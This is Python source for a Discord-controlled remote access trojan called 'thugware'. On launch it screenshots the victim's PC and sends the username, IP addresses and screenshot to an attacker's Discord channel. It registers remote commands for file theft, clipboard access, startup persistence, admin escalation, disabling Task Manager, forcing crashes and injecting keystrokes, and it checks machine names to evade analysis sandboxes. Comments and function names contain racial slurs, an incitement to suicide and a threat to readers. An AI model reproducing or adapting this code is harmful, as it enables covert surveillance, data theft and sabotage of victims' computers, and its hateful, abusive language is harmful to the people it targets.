import discord
from discord.ext import commands
import platform
import os
import asyncio
import sys
import cmmmds
from blacklistednames import blacklisted
from PIL import ImageGrab
import requests
import socket
from datetime import datetime
import spammer

def is_pc_blacklisted(pc_name):
    return pc_name.lower() in blacklisted

def move_mouse_and_exit():
    for _ in range(5):
        pyautogui.moveTo(100, 100, duration=1)
        pyautogui.moveTo(200, 200, duration=1)
    exit()

pc_name = platform.node()

if is_pc_blacklisted(pc_name):
    move_mouse_and_exit()

intents = discord.Intents.all()
bot = commands.Bot(command_prefix='.', intents=intents)

session_channel_name = None

async def find_or_create_channel(guild, base_name="session"):
    global session_channel_name
    try:
        for channel_number in range(1, 501):
            channel_name = f"{base_name}{channel_number}"
            session_channel = discord.utils.get(guild.channels, name=channel_name)
            if session_channel is None:
                session_channel = await guild.create_text_channel(channel_name)
                await session_channel.send(f"This channel is for bot commands for {channel_name}.")
                session_channel_name = channel_name
                print(f"Created new channel: {channel_name} in guild: {guild.name}")
                return session_channel
        raise Exception("All 500 session channels are already created. Please delete one to proceed.")
    except discord.errors.Forbidden:
        print(f"Bot does not have permission to create channels in guild: {guild.name}")
    except discord.errors.HTTPException as e:
        print(f"An error occurred: {e}")


async def send_notice(channel):
    pc_name = os.getenv("COMPUTERNAME")

    # Capture the PC screen
    screenshot_path = "pc_screenshot.png"
    ImageGrab.grab().save(screenshot_path)

    # Get the public and private IPv4 addresses
    public_ip = requests.get("https://api.ipify.org").text
    private_ip = socket.gethostbyname(socket.gethostname())

    # Get the current date and time
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Create a rich embed
    embed = discord.Embed(title="PC Information", color=0xFF5733)
    embed.set_image(url=f"attachment://pc_screenshot.png")
    embed.add_field(name="Username", value=os.getlogin(), inline=False)
    embed.add_field(name="Public IP", value=public_ip, inline=False)
    embed.add_field(name="Private IP", value=private_ip, inline=False)
    embed.add_field(name="Date and Time", value=current_time, inline=False)

    # Send the notice to the session channel
    await channel.send(f"@everyone {pc_name} has run the thugware.", embed=embed, file=discord.File(screenshot_path))

    # Delete the screenshot file after sending
    os.remove(screenshot_path)

@bot.event
async def on_ready():
    for guild in bot.guilds:
        session_channel = await find_or_create_channel(guild)
        if session_channel:
            await send_notice(session_channel)
        else:
            print(f"Skipping guild {guild.name} due to permission issues or channel limit.")
    print(f"Bot is ready and logged in as {bot.user}")


@bot.event
async def on_message(message):
    # Only respond to messages in the created session channel
    if message.channel.name == session_channel_name:
        await bot.process_commands(message)


@bot.command(name='ss')
async def screenshot(ctx):
    await cmmmds.screenshot(ctx)

@bot.command(help='Downloads and opens the shared file')
async def share(ctx):
    await cmmmds.share(ctx)

@bot.command(name='close')
async def close(ctx):
    await cmmmds.close(ctx, bot)

@bot.command(name='cc')
async def cc(ctx):
    await cmmmds.cc(ctx, bot)

@bot.command(name='mousemove')
async def mousemove(ctx, x: int, y: int):
    await cmmmds.mousemove(ctx, x, y)

@bot.command(name='mousefreeze')
async def mousefreeze(ctx):
    await cmmmds.mousefreeze(ctx)

@bot.command(name='speak')
async def speak(ctx, *, message):
    await cmmmds.speak(ctx, message=message)

@bot.command(name='wallpaper')
async def wallpaper(ctx):
    await cmmmds.wallpaper(ctx)

@bot.command(name='boost')
async def boost(ctx, volume: int):
    await cmmmds.boost(ctx, volume)

@bot.command(name='bassboost')
async def bassboost(ctx):
    await cmmmds.bassboost(ctx)

@bot.command(name='startuplist')
async def startuplist(ctx):
    await cmmmds.startuplist(ctx)

@bot.command(name='info')
async def get_system_info(ctx):
    await cmmmds.get_system_info(ctx)
@bot.command(name='clipboard')
async def clipboard_command(ctx, action: str = None, *, content: str = None):
    await cmmmds.clipboard(ctx, action, content)

@bot.command(name='search')
async def search_command(ctx, *, query: str = None):
    await cmmmds.search(ctx, query)

@bot.command(name='openurl')
async def openurl_command(ctx, *, url: str = None):
    await cmmmds.openurl(ctx, url)

@bot.command(name='filethief')
async def filethief_command(ctx):
    await cmmmds.filethief(ctx)

@bot.command(name='upsidedown')
async def upside_down_command(ctx):
    await cmmmds.upside_down(ctx)

@bot.command(name='restore')
async def restore_command(ctx):
    await cmmmds.restore_screen(ctx)

@bot.command(name='mouseclick')
async def mouseclick_command(ctx, leftorright: str):
    await cmmmds.mouseclick(ctx, leftorright)

@bot.command(name='taskbar')
async def taskbar_command(ctx, action: str):
    await cmmmds.taskbar(ctx, action)
@bot.command(name='sd')
async def shutthefuckup(ctx):
    await cmmmds.sd(ctx)
@bot.command(name='restartpc')
async def restartpc(ctx):
    await cmmmds.restartpc(ctx)
@bot.command(name='clear')
async def clearmsgs(ctx):
    await cmmmds.clear(ctx)
@bot.command(name='restart')
async def restartscriptfordebugging(ctx):
    await cmmmds.restart(ctx)
@bot.command(name='ip')
async def iplogs(ctx):
    await cmmmds.ip(ctx)
#chatgpt sucks if you are reading this huncho or he commander you are a faggot pedophile and should hang yourself

@bot.command(name='lp')
async def lp(ctx):
    await cmmmds.lp(ctx)
#if you are a skid and youre reading this. WARNING ⚠️⚠️⚠️ this script it dualhooked and if you a reading this i have all your passwords so turn back immediately.
@bot.command(name='pcondrugs')
async def drugiffycrackaddicthomelessinsanenigger(ctx):
 await cmmmds.pcondrugs(ctx)
@bot.command(name='dc')
async def deletechannelsdcforshort(ctx):
    await cmmmds.dc(ctx)
@bot.command(name='kp')
async def killniggersforfun(ctx, *, process_name: str):
    await cmmmds.kp(ctx, process_name)
@bot.command(name='errorspamz')
async def errorspammer(ctx):
    await cmmmds.gdirollzlol(ctx)
@bot.command(name='meth')
async def methheadpc(ctx):
    await cmmmds.drugify(ctx)
@bot.command(name='bsod')
async def bsodify(ctx):
    await cmmmds.bsod(ctx)
@bot.command(name='startup')
async def startupappsaddpls(ctx):
    await cmmmds.startup(ctx)
@bot.command(name='clone')
async def clonener(ctx):
    await cmmmds.clone(ctx)
@bot.command(name='cmd')
async def cmd(ctx):
    await cmmmds.cmd(ctx)
@bot.command(name='alist')
async def alistcmd(ctx):
    await cmmmds.alist(ctx)
@bot.command(name='fixprof')
async def fixprofilescmd(ctx):
    await cmmmds.fixprof(ctx)
@bot.command(name='thug')
async def thugcommand(ctx):
    await cmmmds.thug(ctx)
@bot.command(name='double')
async def dublle(ctx):
    await cmmmds.double(ctx)
@bot.command(name='type')
async def typpe(ctx, *, message: str):
    await cmmmds.type_message(message)
    await ctx.send(f"Typed: {message}")

@bot.command(name='typeenter')
async def typpeee(ctx, *, message: str):
    await cmmmds.type_enter(message)
    await ctx.send(f"Typed and sent: {message}")

@bot.command(name='nomouse')
async def nomouse(ctx):
    await cmmmds.nomouse(ctx)
@bot.command(name='thugspam')
async def daspammer(ctx):
    await cmmmds.create_profiles(ctx)
@bot.command(name='isadmin')
async def admincheccer(ctx):
    await cmmmds.isadmin(ctx)

@bot.command(name='admin')
async def admingiver(ctx):
    await cmmmds.askadmin(ctx)
@bot.command(name='blockkey')
async def blockkey(ctx, *keys: str):
    await cmmmds.blockkey(ctx)
@bot.command(name='notype')
async def notype(ctx):
    cmmmds.notypemode()
    await ctx.send("Started notypemode!")
@bot.command(name='thugshake')
async def thugshake(ctx):
    cmmmds.thugshaker()
    await ctx.send("Thugshaker mode activated.")
@bot.command(name='tunnel')
async def tunnel(ctx):
    cmmmds.start_tunnel_thread()
    await ctx.send("Tunnel effect activated on a separate thread.")

@bot.command(name='path')
async def pathcmd(ctx, action=None, *args):
    await cmmmds.path(ctx, action, *args)

@bot.command(name='embedfiles')
async def startup(ctx):
    await cmmmds.startup(ctx)

@bot.command(name='notify')
async def notify(ctx, *args):
    message = " ".join(args)  # Combine all args into a single message string
    await cmmmds.notify(ctx, message)

@bot.command()
async def hitler(ctx):
    await cmmmds.handle_hitler_command(ctx) 

@bot.command()
async def ps(ctx):
    await cmmmds.handle_ps_command(ctx)

@bot.command()
async def enabletm(ctx):
    await cmmmds.enable_task_manager(ctx)  

@bot.command()
async def disabletm(ctx):
    await cmmmds.disable_task_manager(ctx)

@bot.command()
async def sysinfo(ctx):
    await cmmmds.get_system_info(ctx) 

@bot.command()
async def place(ctx):
    await cmmmds.upload_and_add_to_startup(ctx)

@bot.command()
async def desktopfill(ctx):
    await cmmmds.fill_desktop_with_shortcuts(ctx)

@bot.command()
async def troll(ctx):
    await ctx.send("Trolling initiated. Enjoy!")
    await asyncio.to_thread(spammer.start_trolling)

@bot.command(name='warning')
async def warning(ctx):    
    await cmmmds.sss(ctx)

@bot.command(name='loopkill')
async def killy(ctx, process_name: str):
    await cmmmds.loopkilling(ctx, process_name)

@bot.command()
async def startbassboost(ctx):
    await cmmmds.start_bassboost(ctx)
    await ctx.send("Bass boost started!")

@bot.command(help='Locks the computer')
async def lock(ctx):
    await cmmmds.lock_computer()
    await ctx.send("Computer locked.")

@bot.command()
async def runfile(ctx, fullpath):
    try:
        with open(fullpath, 'r') as f:
            content = f.read()
        await ctx.send(f"Executing file: {fullpath}")
        await ctx.send(f"```{content}```")
    except FileNotFoundError:
        await ctx.send(f"File not found: {fullpath}")
    except Exception as e:
        await ctx.send(f"Error executing file: {fullpath}\n```{e}```")

@bot.command()
async def pcusername(ctx):
    pc_name = os.getenv("COMPUTERNAME")
    embed = discord.Embed(title="PC Information", color=0xFF5733)
    embed.add_field(name="Username", value=pc_name, inline=False)
    embed.add_field(name="Public IP", value=requests.get("https://api.ipify.org").text, inline=False)
    embed.add_field(name="Private IP", value=socket.gethostbyname(socket.gethostname()), inline=False)
    embed.add_field(name="Date and Time", value=datetime.now().strftime("%Y-%m-%d %H:%M:%S"), inline=False)
    await ctx.send(embed=embed)


@bot.command()
async def listexes(ctx):
    downloads_folder = os.path.expanduser('~/Downloads')
    exe_files = []
    
    if os.path.exists(downloads_folder):
        for root, dirs, files in os.walk(downloads_folder):
            for file in files:
                if file.endswith(".exe"):
                    exe_files.append(os.path.join(root, file))
    
    if exe_files:
        await ctx.send("\n".join(exe_files))
    else:
        await ctx.send("No .exe files found in Downloads folder.")




TOKEN = "YOUR BOT TOKEN HERE"
bot.run(TOKEN)
